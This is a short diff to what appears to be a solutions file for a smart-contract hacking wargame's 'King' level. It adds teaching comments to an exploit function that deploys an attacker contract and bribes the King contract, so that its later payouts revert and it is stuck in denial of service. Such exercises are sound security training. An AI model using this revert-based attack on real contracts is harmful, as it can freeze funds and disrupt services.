@@ -12,6 +12,8 @@ def test_lv09():
 
 def exploit_lv09(contract: King) -> Address:
     # Attack vector: transaction can be reverted inside receive/fallback function
+    # Training: you have to count on fact, that using transfer/send/call on external address can fail
+
     attacker = EternalKing.deploy()
     attacker.bribe(contract.address, value=2 * 10**18)
     return attacker.address
